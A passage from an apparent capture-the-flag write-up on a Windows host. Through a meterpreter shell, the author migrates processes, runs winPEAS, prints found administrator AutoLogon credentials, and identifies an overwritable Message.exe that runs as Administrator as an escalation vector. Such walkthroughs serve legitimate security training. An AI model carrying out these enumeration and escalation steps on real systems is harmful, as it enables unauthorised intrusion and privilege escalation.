</span></span><span style=display:flex><span> <span style=color:#ae81ff>1460</span>  <span style=color:#ae81ff>2792</span>  hello.exe             x86   <span style=color:#ae81ff>0</span>        IIS APPPOOL<span style=color:#ae81ff>\B</span>log  c:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\T</span>emp<span style=color:#ae81ff>\h</span>ello.exe
</span></span><span style=display:flex><span> <span style=color:#ae81ff>1488</span>  <span style=color:#ae81ff>1372</span>  w3wp.exe              x64   <span style=color:#ae81ff>0</span>        IIS APPPOOL<span style=color:#ae81ff>\B</span>log  C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\S</span>ystem32<span style=color:#ae81ff>\i</span>netsrv<span style=color:#ae81ff>\w</span>3wp.exe
</span></span><span style=display:flex><span> <span style=color:#ae81ff>1548</span>  <span style=color:#ae81ff>1388</span>  WScheduler.exe                                         
</span></span><span style=display:flex><span> <span style=color:#ae81ff>1652</span>  <span style=color:#ae81ff>672</span>   Ec2Config.exe                                          
</span></span><span style=display:flex><span> <span style=color:#ae81ff>1740</span>  <span style=color:#ae81ff>740</span>   WmiPrvSE.exe                                           
</span></span><span style=display:flex><span> <span style=color:#ae81ff>1988</span>  <span style=color:#ae81ff>672</span>   msdtc.exe                                              
</span></span><span style=display:flex><span> <span style=color:#ae81ff>2412</span>  <span style=color:#ae81ff>1200</span>  WScheduler.exe                                         
</span></span><span style=display:flex><span> <span style=color:#ae81ff>2588</span>  <span style=color:#ae81ff>904</span>   taskhostex.exe                                         
</span></span><span style=display:flex><span> <span style=color:#ae81ff>2664</span>  <span style=color:#ae81ff>2656</span>  explorer.exe                                           
</span></span><span style=display:flex><span> <span style=color:#ae81ff>2792</span>  <span style=color:#ae81ff>1488</span>  cmd.exe               x64   <span style=color:#ae81ff>0</span>        IIS APPPOOL<span style=color:#ae81ff>\B</span>log  C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\S</span>ystem32<span style=color:#ae81ff>\c</span>md.exe
</span></span><span style=display:flex><span> <span style=color:#ae81ff>3064</span>  <span style=color:#ae81ff>2612</span>  ServerManager.exe                                      
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>meterpreter &gt; migrate <span style=color:#ae81ff>1488</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Migrating from <span style=color:#ae81ff>1460</span> to 1488...
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Migration completed successfully.
</span></span></code></pre></div><h3 id=local-enumeration>Local Enumeration <a href=#local-enumeration class=anchor>üîó</a></h3><p>Now that I had achieved slightly stabler shell, I decided to start poking around the machine for a better escalation vector. I began this by using the new meterpreter shell to upload a copy of <code>winPEAS</code> to see if anything major stood out to me on the host.</p><p>I&rsquo;ve truncated some of the <code>winPEAS</code> output for brevity.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>meterpreter &gt; upload /root/ctf/transfer/privilege-escalation-awesome-scripts-suite/winPEAS/winPEASexe/winPEAS/bin/Release/
</span></span><span style=display:flex><span>Dotfuscated         de                  fr                  pl                  winPEAS.exe.config  zh-CN               
</span></span><span style=display:flex><span>Dotfuscator1.xml    es                  it                  ru                  winPEAS.pdb         
</span></span><span style=display:flex><span>meterpreter &gt; upload /root/ctf/transfer/privilege-escalation-awesome-scripts-suite/winPEAS/winPEASexe/winPEAS/bin/Releasex64/Release/winPEAS.exe
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> uploading  : /root/ctf/transfer/privilege-escalation-awesome-scripts-suite/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEAS.exe -&gt; winPEAS.exe
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Uploaded 461.00 KiB of 461.00 KiB <span style=color:#f92672>(</span>100.0%<span style=color:#f92672>)</span>: /root/ctf/transfer/privilege-escalation-awesome-scripts-suite/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEAS.exe -&gt; winPEAS.exe
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> uploaded   : /root/ctf/transfer/privilege-escalation-awesome-scripts-suite/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEAS.exe -&gt; winPEAS.exe
</span></span><span style=display:flex><span>meterpreter &gt; shell
</span></span><span style=display:flex><span>Process <span style=color:#ae81ff>352</span> created.
</span></span><span style=display:flex><span>Channel <span style=color:#ae81ff>2</span> created.
</span></span><span style=display:flex><span>Microsoft Windows <span style=color:#f92672>[</span>Version 6.3.9600<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>c<span style=color:#f92672>)</span> <span style=color:#ae81ff>2013</span> Microsoft Corporation. All rights reserved.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>c:<span style=color:#ae81ff>\w</span>indows<span style=color:#ae81ff>\t</span>emp&gt;.<span style=color:#ae81ff>\w</span>inPEAS.exe
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>  <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Looking <span style=color:#66d9ef>for</span> AutoLogon credentials
</span></span><span style=display:flex><span>    Some AutoLogon credentials were found!!
</span></span><span style=display:flex><span>    DefaultUserName               :  administrator
</span></span><span style=display:flex><span>    DefaultPassword               :  4q6XvFES7Fdxs
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>  <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Installed Applications --Via Program Files/Uninstall registry--
</span></span><span style=display:flex><span>   <span style=color:#f92672>[</span>?<span style=color:#f92672>]</span> Check <span style=color:#66d9ef>if</span> you can modify installed software https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#software
</span></span><span style=display:flex><span>    C:<span style=color:#ae81ff>\P</span>rogram Files <span style=color:#f92672>(</span>x86<span style=color:#f92672>)</span><span style=color:#ae81ff>\S</span>ystemScheduler<span style=color:#f92672>(</span>Everyone <span style=color:#f92672>[</span>WriteData/CreateFiles<span style=color:#f92672>])</span>
</span></span><span style=display:flex><span>    C:<span style=color:#ae81ff>\P</span>rogram Files<span style=color:#ae81ff>\A</span>mazon
</span></span><span style=display:flex><span>    C:<span style=color:#ae81ff>\P</span>rogram Files<span style=color:#ae81ff>\C</span>ommon Files
</span></span><span style=display:flex><span>    C:<span style=color:#ae81ff>\P</span>rogram Files<span style=color:#ae81ff>\d</span>esktop.ini
</span></span><span style=display:flex><span>    C:<span style=color:#ae81ff>\P</span>rogram Files<span style=color:#ae81ff>\I</span>nternet Explorer
</span></span><span style=display:flex><span>    C:<span style=color:#ae81ff>\P</span>rogram Files<span style=color:#ae81ff>\U</span>ninstall Information
</span></span><span style=display:flex><span>    C:<span style=color:#ae81ff>\P</span>rogram Files<span style=color:#ae81ff>\W</span>indows Mail
</span></span><span style=display:flex><span>    C:<span style=color:#ae81ff>\P</span>rogram Files<span style=color:#ae81ff>\W</span>indows NT
</span></span><span style=display:flex><span>    C:<span style=color:#ae81ff>\P</span>rogram Files<span style=color:#ae81ff>\W</span>indowsApps
</span></span><span style=display:flex><span>    C:<span style=color:#ae81ff>\P</span>rogram Files<span style=color:#ae81ff>\W</span>indowsPowerShell
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>    WindowsScheduler<span style=color:#f92672>(</span>Splinterware Software Solutions - System Scheduler Service<span style=color:#f92672>)[</span>C:<span style=color:#ae81ff>\P</span>ROGRA~2<span style=color:#ae81ff>\S</span>YSTEM~1<span style=color:#ae81ff>\W</span>Service.exe<span style=color:#f92672>]</span> - Auto - Running
</span></span><span style=display:flex><span>    YOU CAN MODIFY THIS SERVICE: Start, AllAccess
</span></span><span style=display:flex><span>    File Permissions: Everyone <span style=color:#f92672>[</span>WriteData/CreateFiles<span style=color:#f92672>]</span>, SYSTEM <span style=color:#f92672>[</span>AllAccess<span style=color:#f92672>]</span>, Administrators <span style=color:#f92672>[</span>AllAccess<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>    Possible DLL Hijacking in binary folder: C:<span style=color:#ae81ff>\P</span>rogram Files <span style=color:#f92672>(</span>x86<span style=color:#f92672>)</span><span style=color:#ae81ff>\S</span>ystemScheduler <span style=color:#f92672>(</span>Everyone <span style=color:#f92672>[</span>WriteData/CreateFiles<span style=color:#f92672>]</span>, SYSTEM <span style=color:#f92672>[</span>AllAccess<span style=color:#f92672>]</span>, Administrators <span style=color:#f92672>[</span>AllAccess<span style=color:#f92672>])</span>
</span></span><span style=display:flex><span>    System Scheduler Service Wrapper
</span></span><span style=display:flex><span>   <span style=color:#f92672>=================================================================================================</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Modifiable Services
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>    WSService: Start, WriteData/CreateFiles, TakeOwnership
</span></span></code></pre></div><p>In addition to a ton of information about the host, there appears to be an administrator set of credentials, as well as a service (WScheduler) that is locally modifiable and running as an administrative user. Since this appeared to be the intended attack vector, I decided to attack this further.</p><h3 id=attacking-wscheduler>Attacking WScheduler <a href=#attacking-wscheduler class=anchor>üîó</a></h3><p>I started by taking a look at the <code>WScheduler</code> service</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>c:\Program Files (x86)\SystemScheduler&gt;sc qc WindowsScheduler
</span></span><span style=display:flex><span>[<span style=color:#66d9ef>SC</span>] QueryServiceConfig SUCCESS
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>SERVICE_NAME<span style=color:#960050;background-color:#1e0010>:</span> WindowsScheduler
</span></span><span style=display:flex><span>        TYPE               <span style=color:#960050;background-color:#1e0010>:</span> <span style=color:#ae81ff>10</span>  WIN32_OWN_PROCESS 
</span></span><span style=display:flex><span>        START_TYPE         <span style=color:#960050;background-color:#1e0010>:</span> <span style=color:#ae81ff>2</span>   AUTO_START
</span></span><span style=display:flex><span>        ERROR_CONTROL      <span style=color:#960050;background-color:#1e0010>:</span> <span style=color:#ae81ff>0</span>   IGNORE
</span></span><span style=display:flex><span>        BINARY_PATH_NAME   <span style=color:#960050;background-color:#1e0010>:</span> C:\PROGRA~<span style=color:#ae81ff>2</span>\SYSTEM~<span style=color:#ae81ff>1</span>\WService.exe
</span></span><span style=display:flex><span>        LOAD_ORDER_GROUP   <span style=color:#960050;background-color:#1e0010>:</span> 
</span></span><span style=display:flex><span>        TAG                <span style=color:#960050;background-color:#1e0010>:</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>        DISPLAY_NAME       <span style=color:#960050;background-color:#1e0010>:</span> System Scheduler Service
</span></span><span style=display:flex><span>        DEPENDENCIES       <span style=color:#960050;background-color:#1e0010>:</span> 
</span></span><span style=display:flex><span>        SERVICE_START_NAME <span style=color:#960050;background-color:#1e0010>:</span> LocalSystem
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>meterpreter &gt; cd PrograProgram Files  <span style=color:#e6db74>&#34;Program Files (x86)&#34;</span> 
</span></span><span style=display:flex><span>meterpreter &gt; cd SystemScheduler 
</span></span><span style=display:flex><span>meterpreter &gt; ls
</span></span><span style=display:flex><span>Listing: c:<span style=color:#ae81ff>\P</span>rogram Files <span style=color:#f92672>(</span>x86<span style=color:#f92672>)</span><span style=color:#ae81ff>\S</span>ystemScheduler
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Mode              Size     Type  Last modified              Name
</span></span><span style=display:flex><span>----              ----     ----  -------------              ----
</span></span><span style=display:flex><span>40777/rwxrwxrwx   <span style=color:#ae81ff>4096</span>     dir   2019-08-04 11:36:53 +0000  Events
</span></span><span style=display:flex><span>100666/rw-rw-rw-  <span style=color:#ae81ff>60</span>       fil   2019-08-04 11:36:42 +0000  Forum.url
</span></span><span style=display:flex><span>100666/rw-rw-rw-  <span style=color:#ae81ff>9813</span>     fil   2019-08-04 11:36:42 +0000  License.txt
</span></span><span style=display:flex><span>100666/rw-rw-rw-  <span style=color:#ae81ff>1496</span>     fil   2019-08-04 11:37:02 +0000  LogFile.txt
</span></span><span style=display:flex><span>100666/rw-rw-rw-  <span style=color:#ae81ff>3760</span>     fil   2019-08-04 11:36:53 +0000  LogfileAdvanced.txt
</span></span><span style=display:flex><span>100777/rwxrwxrwx  <span style=color:#ae81ff>536992</span>   fil   2019-08-04 11:36:42 +0000  Message.exe
</span></span><span style=display:flex><span>100777/rwxrwxrwx  <span style=color:#ae81ff>445344</span>   fil   2019-08-04 11:36:42 +0000  PlaySound.exe
</span></span><span style=display:flex><span>100777/rwxrwxrwx  <span style=color:#ae81ff>27040</span>    fil   2019-08-04 11:36:42 +0000  PlayWAV.exe
</span></span><span style=display:flex><span>100666/rw-rw-rw-  <span style=color:#ae81ff>149</span>      fil   2019-08-04 11:36:53 +0000  Preferences.ini
</span></span><span style=display:flex><span>100777/rwxrwxrwx  <span style=color:#ae81ff>485792</span>   fil   2019-08-04 11:36:42 +0000  Privilege.exe
</span></span><span style=display:flex><span>100666/rw-rw-rw-  <span style=color:#ae81ff>10100</span>    fil   2019-08-04 11:36:42 +0000  ReadMe.txt
</span></span><span style=display:flex><span>100777/rwxrwxrwx  <span style=color:#ae81ff>112544</span>   fil   2019-08-04 11:36:42 +0000  RunNow.exe
</span></span><span style=display:flex><span>100777/rwxrwxrwx  <span style=color:#ae81ff>235936</span>   fil   2019-08-04 11:36:42 +0000  SSAdmin.exe
</span></span><span style=display:flex><span>100777/rwxrwxrwx  <span style=color:#ae81ff>731552</span>   fil   2019-08-04 11:36:42 +0000  SSCmd.exe
</span></span><span style=display:flex><span>100777/rwxrwxrwx  <span style=color:#ae81ff>456608</span>   fil   2019-08-04 11:36:42 +0000  SSMail.exe
</span></span><span style=display:flex><span>100777/rwxrwxrwx  <span style=color:#ae81ff>1633696</span>  fil   2019-08-04 11:36:42 +0000  Scheduler.exe
</span></span><span style=display:flex><span>100777/rwxrwxrwx  <span style=color:#ae81ff>491936</span>   fil   2019-08-04 11:36:42 +0000  SendKeysHelper.exe
</span></span><span style=display:flex><span>100777/rwxrwxrwx  <span style=color:#ae81ff>437664</span>   fil   2019-08-04 11:36:42 +0000  ShowXY.exe
</span></span><span style=display:flex><span>100777/rwxrwxrwx  <span style=color:#ae81ff>439712</span>   fil   2019-08-04 11:36:42 +0000  ShutdownGUI.exe
</span></span><span style=display:flex><span>100666/rw-rw-rw-  <span style=color:#ae81ff>785042</span>   fil   2019-08-04 11:36:42 +0000  WSCHEDULER.CHM
</span></span><span style=display:flex><span>100666/rw-rw-rw-  <span style=color:#ae81ff>703081</span>   fil   2019-08-04 11:36:42 +0000  WSCHEDULER.HLP
</span></span><span style=display:flex><span>100777/rwxrwxrwx  <span style=color:#ae81ff>136096</span>   fil   2019-08-04 11:36:42 +0000  WSCtrl.exe
</span></span><span style=display:flex><span>100777/rwxrwxrwx  <span style=color:#ae81ff>68512</span>    fil   2019-08-04 11:36:42 +0000  WSLogon.exe
</span></span><span style=display:flex><span>100666/rw-rw-rw-  <span style=color:#ae81ff>33184</span>    fil   2019-08-04 11:36:42 +0000  WSProc.dll
</span></span><span style=display:flex><span>100666/rw-rw-rw-  <span style=color:#ae81ff>2026</span>     fil   2019-08-04 11:36:42 +0000  WScheduler.cnt
</span></span><span style=display:flex><span>100777/rwxrwxrwx  <span style=color:#ae81ff>331168</span>   fil   2019-08-04 11:36:42 +0000  WScheduler.exe
</span></span><span style=display:flex><span>100777/rwxrwxrwx  <span style=color:#ae81ff>98720</span>    fil   2019-08-04 11:36:42 +0000  WService.exe
</span></span><span style=display:flex><span>100666/rw-rw-rw-  <span style=color:#ae81ff>54</span>       fil   2019-08-04 11:36:42 +0000  Website.url
</span></span><span style=display:flex><span>100777/rwxrwxrwx  <span style=color:#ae81ff>76704</span>    fil   2019-08-04 11:36:42 +0000  WhoAmI.exe
</span></span><span style=display:flex><span>100666/rw-rw-rw-  <span style=color:#ae81ff>1150</span>     fil   2019-08-04 11:36:42 +0000  alarmclock.ico
</span></span><span style=display:flex><span>100666/rw-rw-rw-  <span style=color:#ae81ff>766</span>      fil   2019-08-04 11:36:42 +0000  clock.ico
</span></span><span style=display:flex><span>100666/rw-rw-rw-  <span style=color:#ae81ff>80856</span>    fil   2019-08-04 11:36:42 +0000  ding.wav
</span></span><span style=display:flex><span>100666/rw-rw-rw-  <span style=color:#ae81ff>1637972</span>  fil   2019-08-04 11:36:42 +0000  libeay32.dll
</span></span><span style=display:flex><span>100777/rwxrwxrwx  <span style=color:#ae81ff>40352</span>    fil   2019-08-04 11:36:42 +0000  sc32.exe
</span></span><span style=display:flex><span>100666/rw-rw-rw-  <span style=color:#ae81ff>766</span>      fil   2019-08-04 11:36:42 +0000  schedule.ico
</span></span><span style=display:flex><span>100666/rw-rw-rw-  <span style=color:#ae81ff>355446</span>   fil   2019-08-04 11:36:42 +0000  ssleay32.dll
</span></span><span style=display:flex><span>100666/rw-rw-rw-  <span style=color:#ae81ff>6999</span>     fil   2019-08-04 11:36:42 +0000  unins000.dat
</span></span><span style=display:flex><span>100777/rwxrwxrwx  <span style=color:#ae81ff>722597</span>   fil   2019-08-04 11:36:42 +0000  unins000.exe
</span></span><span style=display:flex><span>100666/rw-rw-rw-  <span style=color:#ae81ff>6574</span>     fil   2019-08-04 11:36:42 +0000  whiteclock.ico
</span></span></code></pre></div><p>Once in the directory, I started trying to identify what the service did as there were a ton of executable files that could be potential vectors. The most obvious seemed to be <code>WService</code> however I currently wasn&rsquo;t able to restart the service so I wasn&rsquo;t yet sure how I would exploit it. I took a look at <code>LogFile.txt</code> which lead me to believe it didn&rsquo;t restart frequently on its own.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>meterpreter &gt; cat LogFile.txt
</span></span><span style=display:flex><span>08/04/19 04:37:02,Starting System Scheduler SERVICE <span style=color:#f92672>(</span>SYSTEM<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>08/04/19 11:47:18,Starting System Scheduler SERVICE <span style=color:#f92672>(</span>SYSTEM<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>08/04/19 15:03:47,Starting System Scheduler SERVICE <span style=color:#f92672>(</span>SYSTEM<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>08/04/19 16:42:54,Starting System Scheduler SERVICE <span style=color:#f92672>(</span>SYSTEM<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>08/04/19 16:47:29,Stopping System Scheduler SERVICE. <span style=color:#f92672>(</span>SYSTEM<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>08/04/19 16:47:37,Starting System Scheduler SERVICE <span style=color:#f92672>(</span>SYSTEM<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>08/04/19 17:59:37,Starting System Scheduler SERVICE <span style=color:#f92672>(</span>SYSTEM<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>08/04/19 18:04:10,Stopping System Scheduler SERVICE. <span style=color:#f92672>(</span>SYSTEM<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>08/05/19 14:03:43,Starting System Scheduler SERVICE <span style=color:#f92672>(</span>SYSTEM<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>08/06/19 14:11:27,Starting System Scheduler SERVICE <span style=color:#f92672>(</span>SYSTEM<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>08/06/19 14:16:26,Stopping System Scheduler SERVICE. <span style=color:#f92672>(</span>SYSTEM<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>10/02/20 14:12:16,Starting System Scheduler SERVICE <span style=color:#f92672>(</span>SYSTEM<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>10/02/20 14:30:29,Stopping System Scheduler SERVICE. <span style=color:#f92672>(</span>SYSTEM<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>10/02/20 14:31:29,Starting System Scheduler SERVICE <span style=color:#f92672>(</span>SYSTEM<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>10/02/20 14:48:55,Stopping System Scheduler SERVICE. <span style=color:#f92672>(</span>SYSTEM<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>10/02/20 14:50:01,Starting System Scheduler SERVICE <span style=color:#f92672>(</span>SYSTEM<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>10/02/20 15:03:23,Stopping System Scheduler SERVICE. <span style=color:#f92672>(</span>SYSTEM<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>10/02/20 15:04:22,Starting System Scheduler SERVICE <span style=color:#f92672>(</span>SYSTEM<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>10/02/20 15:05:49,Stopping System Scheduler SERVICE. <span style=color:#f92672>(</span>SYSTEM<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>10/02/20 15:06:49,Starting System Scheduler SERVICE <span style=color:#f92672>(</span>SYSTEM<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>10/02/20 15:10:59,Stopping System Scheduler SERVICE. <span style=color:#f92672>(</span>SYSTEM<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>11/18/20 14:11:57,Starting System Scheduler SERVICE <span style=color:#f92672>(</span>SYSTEM<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>I then looked under the <code>Events</code> directory where I found a log file that indicated the <code>Message.exe</code> binary was executed approximately every 30 seconds as the administrative user. This binary was overwritable and appeared to be a perfect vector to attack for an administrative shell.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>meterpreter &gt; cd Events 
</span></span><span style=display:flex><span>meterpreter &gt; ls
</span></span><span style=display:flex><span>Listing<span style=color:#960050;background-color:#1e0010>:</span> c:\Program Files (x86)\SystemScheduler\Events
</span></span><span style=display:flex><span>======================================================
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Mode              Size   Type  Last modified              Name
</span></span><span style=display:flex><span>----              ----   ----  -------------              ----
</span></span><span style=display:flex><span><span style=color:#ae81ff>100666</span>/rw-rw-rw-  <span style=color:#ae81ff>1926</span>   fil   <span style=color:#ae81ff>2019</span>-<span style=color:#ae81ff>08</span>-<span style=color:#ae81ff>04</span> <span style=color:#ae81ff>22</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>05</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>19</span> <span style=color:#ae81ff>+0000</span>  <span style=color:#ae81ff>20198415519</span>.INI
</span></span><span style=display:flex><span><span style=color:#ae81ff>100666</span>/rw-rw-rw-  <span style=color:#ae81ff>24441</span>  fil   <span style=color:#ae81ff>2019</span>-<span style=color:#ae81ff>08</span>-<span style=color:#ae81ff>04</span> <span style=color:#ae81ff>22</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>06</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>01</span> <span style=color:#ae81ff>+0000</span>  <span style=color:#ae81ff>20198415519</span>.INI_LOG.txt
</span></span><span style=display:flex><span><span style=color:#ae81ff>100666</span>/rw-rw-rw-  <span style=color:#ae81ff>290</span>    fil   <span style=color:#ae81ff>2020</span>-<span style=color:#ae81ff>10</span>-<span style=color:#ae81ff>02</span> <span style=color:#ae81ff>21</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>50</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>12</span> <span style=color:#ae81ff>+0000</span>  <span style=color:#ae81ff>2020102145012</span>.INI
</span></span><span style=display:flex><span><span style=color:#ae81ff>100666</span>/rw-rw-rw-  <span style=color:#ae81ff>186</span>    fil   <span style=color:#ae81ff>2020</span>-<span style=color:#ae81ff>11</span>-<span style=color:#ae81ff>18</span> <span style=color:#ae81ff>22</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>12</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>31</span> <span style=color:#ae81ff>+0000</span>  Administrator.flg
</span></span><span style=display:flex><span><span style=color:#ae81ff>100666</span>/rw-rw-rw-  <span style=color:#ae81ff>182</span>    fil   <span style=color:#ae81ff>2020</span>-<span style=color:#ae81ff>11</span>-<span style=color:#ae81ff>18</span> <span style=color:#ae81ff>22</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>11</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>57</span> <span style=color:#ae81ff>+0000</span>  SYSTEM_svc.flg
</span></span><span style=display:flex><span><span style=color:#ae81ff>100666</span>/rw-rw-rw-  <span style=color:#ae81ff>0</span>      fil   <span style=color:#ae81ff>2020</span>-<span style=color:#ae81ff>11</span>-<span style=color:#ae81ff>18</span> <span style=color:#ae81ff>22</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>12</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>31</span> <span style=color:#ae81ff>+0000</span>  Scheduler.flg
</span></span><span style=display:flex><span><span style=color:#ae81ff>100666</span>/rw-rw-rw-  <span style=color:#ae81ff>449</span>    fil   <span style=color:#ae81ff>2019</span>-<span style=color:#ae81ff>08</span>-<span style=color:#ae81ff>04</span> <span style=color:#ae81ff>11</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>36</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>53</span> <span style=color:#ae81ff>+0000</span>  SessionInfo.flg
</span></span><span style=display:flex><span><span style=color:#ae81ff>100666</span>/rw-rw-rw-  <span style=color:#ae81ff>0</span>      fil   <span style=color:#ae81ff>2020</span>-<span style=color:#ae81ff>11</span>-<span style=color:#ae81ff>18</span> <span style=color:#ae81ff>22</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>11</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>57</span> <span style=color:#ae81ff>+0000</span>  service.flg
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>meterpreter &gt; cat <span style=color:#ae81ff>20198415519</span>.INI_LOG.txt
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span><span style=color:#ae81ff>11</span>/<span style=color:#ae81ff>18</span>/<span style=color:#ae81ff>20</span> <span style=color:#ae81ff>14</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>58</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>00</span>,Event Started Ok, (Administrator)
</span></span><span style=display:flex><span><span style=color:#ae81ff>11</span>/<span style=color:#ae81ff>18</span>/<span style=color:#ae81ff>20</span> <span style=color:#ae81ff>14</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>58</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>33</span>,<span style=color:#66d9ef>Process</span> Ended. PID<span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>1976</span>,ExitCode<span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>4</span>,Message.exe (Administrator)
</span></span><span style=display:flex><span><span style=color:#ae81ff>11</span>/<span style=color:#ae81ff>18</span>/<span style=color:#ae81ff>20</span> <span style=color:#ae81ff>14</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>59</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>01</span>,Event Started Ok, (Administrator)
</span></span><span style=display:flex><span><span style=color:#ae81ff>11</span>/<span style=color:#ae81ff>18</span>/<span style=color:#ae81ff>20</span> <span style=color:#ae81ff>14</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>59</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>34</span>,<span style=color:#66d9ef>Process</span> Ended. PID<span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>2820</span>,ExitCode<span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>4</span>,Message.exe (Administrator)
</span></span><span style=display:flex><span><span style=color:#ae81ff>11</span>/<span style=color:#ae81ff>18</span>/<span style=color:#ae81ff>20</span> <span style=color:#ae81ff>15</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>00</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>01</span>,Event Started Ok, (Administrator)
</span></span><span style=display:flex><span><span style=color:#ae81ff>11</span>/<span style=color:#ae81ff>18</span>/<span style=color:#ae81ff>20</span> <span style=color:#ae81ff>15</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>00</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>33</span>,<span style=color:#66d9ef>Process</span> Ended. PID<span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>980</span>,ExitCode<span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>4</span>,Message.exe (Administrator)
